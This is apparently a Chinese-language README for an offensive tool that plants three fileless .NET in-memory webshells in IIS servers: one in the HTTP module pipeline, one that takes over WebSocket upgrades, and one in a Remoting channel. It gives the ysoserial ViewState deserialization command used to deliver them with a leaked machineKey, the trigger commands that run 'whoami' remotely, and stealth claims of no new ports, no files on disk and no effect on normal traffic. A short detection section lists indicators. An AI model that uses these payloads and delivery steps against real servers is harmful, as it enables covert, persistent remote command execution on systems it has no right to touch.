# dotnet-memshell

> **⚠️ 仅用于授权安全测试。** · [English](README.md)


**三个插入位置互不相同的 .NET 内存马**——单文件载荷、一次反序列化完成武装、对无标记流量完全不可见。

公开的 .NET 内存马（module / handler / route / VirtualPathProvider）几乎全部落在 HTTP 请求管线内的已知位置上。dotnet-memshell 刻意分散到**三个不同层**：管线事件层（带池广播强化）、**HTTP→WebSocket 升级点**（连接接管——WebSocket 内存马思想的 .NET 移植）、以及**业务已注册的 Remoting 通道**（容器式端点注册）。三者全部骑在目标既有端点上：不新增端口、不改 `web.config`、不落地文件。

> ⚠️ **仅用于授权安全测试。** 对未获得书面授权的系统使用这些技术是违法行为，后果自负。

---

## 🎯 三个内存马

| # | 内存马 | 插入位置 | 触发方式 | 最低权限 | 业务影响 |
|---|---|---|---|---|---|
| 1 | **HttpModuleShell** | `HttpApplication` 模块事件管线 | 任意请求带 `MSH-Cmd: <命令>` 头 | w3wp 默认应用池身份 | 无标记请求零扰动 |
| 2 | **WsTakeoverShell** | HTTP→WebSocket 升级点（连接接管） | 握手子协议含 `msh` | 同上 + 集成管线 + WS 特性 | 非握手请求严格 no-op |
| 3 | **RemotingUriShell** | 既有 Remoting 通道的 AppDomain 全局 URI 表 | remoting 调用 `<通道>/msh` | 同上 + 业务跑 Remoting | 业务 URI 并存互不影响 |

```
HTTP.sys / IIS
 └─ ASP.NET 请求管线
     ├─ 模块事件（BeginRequest…）        ← #1 HttpModuleShell
     ├─ 路由 / VPP / handler / endpoint  （已知位置家族，本项目不涉及）
     └─ 升级点（HTTP→WS 握手）           ← #2 WsTakeoverShell

进程内其他协议栈
 └─ 业务既有 Remoting 服务端通道          ← #3 RemotingUriShell
```

## ⚡ 差异点（全部实测）

| 属性 | dotnet-memshell |
|---|---|
| 新增监听端口 | ✅ 无——#1/#2 骑站点 80/443，#3 骑业务通道 |
| `web.config` / 注册表 / URLACL 改动 | ✅ 无（对比：HttpListener 型内存马要 `netsh urlacl`，属管理员动作） |
| 文件落地 | ✅ 无——载荷为单 `.cs`，编译进反序列化内容，程序集字节加载（`Location` 为空） |
| 对无标记流量的影响 | ✅ 无——每个触发点先查魔标记，不命中立即返回 |
| 池覆盖 | ✅ `HttpApplicationFactory._freeList` 池广播——只武装当前实例会漏掉大部分后续请求（实测） |
| 优雅降级 | ✅ #2 在非集成管线下捕获异常照常放行（实测：握手请求仍返回 200） |

## 🧭 调用链

**#1 HttpModuleShell**
```
投递反序列化 → E()
 ├─ HttpContext.Current.ApplicationInstance                 ← 当前处理请求的实例
 └─ HttpApplicationFactory._theApplicationFactory._freeList ← 池内其余实例（池广播）
      每个实例二选一：
      ├─ 集成管线: GetModuleContainer(<module>)
      │     → new SyncEventExecutionStep(app, OnRequest)      [反射构造嵌套私有类型]
      │     → ModuleContainer.AddEvent(BeginRequest, false, step)
      └─ 经典管线 : ApplicationStepManager._execSteps 末尾追加 [只能追加——插到游标
                                                                    之前会重执行当前步]
触发: 请求 → BeginRequest → 注入的 step → OnRequest
      ├─ 无 MSH-Cmd 头 → return（业务请求原样走完全程）
      └─ 有头 → cmd.exe /c <命令> → Response.Write(输出) → End
```

**#2 WsTakeoverShell**
```
同一锚点；处理函数对非握手请求严格 no-op
GET + Upgrade: websocket + Sec-WebSocket-Protocol: msh
 → IsWebSocketRequest 校验 → AcceptWebSocketRequest(Duplex)
 → 连接升级，请求管线到此终止，全双工流由循环独占
 → Receive(命令) → exec → Send(输出) … 直至 Close 帧
```

**#3 RemotingUriShell**
```
E()
 ├─ AppDomain.AssemblyResolve ← 桥接字节加载的程序集（formatter 按程序集名解析
 │                               well-known 类型，必须桥回已加载实例）
 ├─ 守卫: 已存在 IChannelReceiver（业务自托管 remoting 才继续）
 └─ RegisterWellKnownServiceType(E.Svc, "msh", Singleton)
触发: remoting 客户端 → tcp://host:<业务端口>/msh → Svc.Exec(cmd)
```

## ✅ 实测验证（Windows 11 + IIS 10 集成管线，真机）

| 项 | 结果 | 证据 |
|---|---|---|
| **#1 HttpModuleShell** | ✅ | `MSH-Cmd: __verify__` → `armed; integrated=True; pid=...`；`MSH-Cmd: whoami` → `iis apppool\defaultapppool`；无标记请求 200 |
| **#2 WsTakeoverShell** | ✅ | 子协议 `msh` 握手 → 101 后全双工：`whoami`→`iis apppool\defaultapppool`、`hostname`→`your-host`、正常 Close |
| **#3 RemotingUriShell** | ✅ | 业务 `calc(7,8)=15` 与 shell `/msh whoami` **同端口同通道并存**；业务再调 `calc(100,1)=101` |
| 无标记流量隔离 | ✅ | 普通请求 200；无关请求头被忽略；业务 WS（无 msh 子协议）不被劫持 |

### 集成管线两条关键实测结论

1. **通知选择**：向模块容器 `AddEvent` 时，只有 **`RequestNotification.AcquireRequestState`** 会触发；在同一容器上挂 `BeginRequest` / `LogRequest` / `UpdateRequestCache` 实测**不被派发**（`probe_hits` 计数为 0）。载荷默认挂 `AcquireRequestState`。
2. **WebSocket 接管必须抑制页面输出**：`AcceptWebSocketRequest` 之后管线仍会执行页面 handler，必须在同一处理函数内置 `Response.SuppressContent = true` 且 `Response.StatusCode = 101`，否则连接被收尾（`WebSocketException 0x80070040`）。`RemapHandler` 在此阶段不可用（框架只允许在 `MapRequestHandler` 之前调用）。
3. **Remoting 客户端须引用业务程序集**：SAO 调用要求客户端代理类型名与服务端一致，客户端需引用业务 dll（Remoting 固有约束，非本马缺陷）。

## 🔌 用法

生成与投递（前提：目标 `machineKey` 已知/泄露）：
```bash
ysoserial.exe -p ViewState -g XamlAssemblyLoadFromFile ^
  -c "payloads\HttpModuleShell.cs;System.dll;System.Web.dll" ^
  --decryptionalg=AES --decryptionkey=<64位十六进制解密键> ^
  --validationalg=HMACSHA256 --validationkey=<64位十六进制校验键> ^
  --path=/Default.aspx --apppath=/

# 产物 POST 到目标任意启用 ViewState 的页面: __VIEWSTATE=<payload>
# （RemotingUriShell 把引用换成 System.dll;System.Runtime.Remoting.dll）
```

触发：
```powershell
# #1
Invoke-WebRequest http://target/Default.aspx -Headers @{ 'MSH-Cmd' = 'whoami' }
# #2 —— 任意 WebSocket 客户端
$ws = New-Object System.Net.WebSockets.ClientWebSocket
$ws.Options.AddSubProtocol('msh')
$ws.ConnectAsync([Uri]'ws://target/Default.aspx', [Threading.CancellationToken]::None).Wait()
# #3
RemotingShellClient.exe tcp://target:<业务端口>/msh "whoami"
```

不依赖 ysoserial 的本地测试：`tools/build.ps1` + `tools/Loader.aspx`（实验用加载器，切勿部署到生产）。

## 📌 投递面实测结论

| Gadget | 反序列化时是否执行 | 说明 |
|---|---|---|
| `XamlAssemblyLoadFromFile` | ✅ | XAML 解析期加载并实例化——**本项目采用** |
| `ActivitySurrogateSelectorFromFile` | ❌ | 其 `AxHost.State` 包装对 `PropertyBagBinary` 惰性，普通 ViewState 打不动 |
| `TypeConfuseDelegate` | ⚠️ | 走 `Process.Start`（进程外），不符合内存马形态 |

另两个工程事实：ysoserial 的 ViewState 插件内部 `Uri.EscapeDataString` 有约 32K 输入上限（内嵌大程序集需 gzip）；投递那一次 POST 会返回一次性 viewstate 错误页，其后请求正常。

## 🔍 检测与防御

- 各 `HttpApplication` 实例 module container 的步骤清单 / `_execSteps` 长度与框架构建值比对
- `AppDomain.GetAssemblies()` 中 `Location` 为空的程序集（byte[] 加载）
- WS 握手中的陌生子协议；超出请求管线生命周期的长连接
- 反射 `RemotingConfiguration` 内部表，发现非业务声明的 well-known URI
- machineKey 视同高危凭据管理（泄露 = ViewState 反序列化 RCE 面）；监控 worker 进程派生 `cmd.exe`

## 📜 许可与引用

MIT——见 [LICENSE](LICENSE)。

- [veo/wsMemShell](https://github.com/veo/wsMemShell)——WebSocket 内存马思想来源（Java 侧）
- [pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net)——投递载荷生成
- HttpModule 注入手法源自 2023 年中文安全社区公开研究；本仓库增加了 HttpApplication 池广播与经典管线回退。
